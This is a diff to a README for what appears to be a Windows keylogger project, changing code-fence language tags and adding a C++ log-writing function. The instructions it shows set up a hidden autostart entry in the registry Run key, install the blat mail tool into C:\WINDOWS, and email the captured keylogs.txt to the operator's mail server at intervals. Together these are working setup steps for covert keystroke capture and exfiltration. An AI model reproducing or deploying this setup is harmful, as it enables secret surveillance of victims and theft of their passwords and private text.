@@ -57,7 +57,7 @@ You can build the project using Visual Studio or DevC++ (free), then you need to
 Mandatory: Edit the batch file!
 
 With this code you can create windows register file for create an autostart ghost process on windows login. Change the path with your file name
-```
+```batch
 Reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v prova /f
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v prova /t REG_SZ /d "C:\\lancio.exe\" /f
 
@@ -65,7 +65,7 @@ reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v pro
 
 If you want you can change the directory 
 
-```
+```batch
 @COPY blat.exe C:\WINDOWS\blat.exe
 @COPY blat.dll C:\WINDOWS\blat.dll
 @COPY blat.lib C:\WINDOWS\blat.lib
@@ -73,7 +73,7 @@ If you want you can change the directory
 ```
 
 Insert your email server and email address, change the timeout if you want
-```
+```batch
 
 @blat -install out.alice.it yourmail@alice.it
 cls
@@ -82,6 +82,16 @@ timeout /t 15
 @blat keylogs.txt -to yourmail@alice.it -try 2 -subject Keylog
 timeout /t 600
 
+```
+You can change the log file name in the main file
+
+```C++
+void WriteToLog(LPCSTR text) {
+ ofstream logfile;
+ logfile.open("keylogs.txt", fstream::app);
+ logfile << text;
+ logfile.close();
+}
 ```
 
 > **Note**
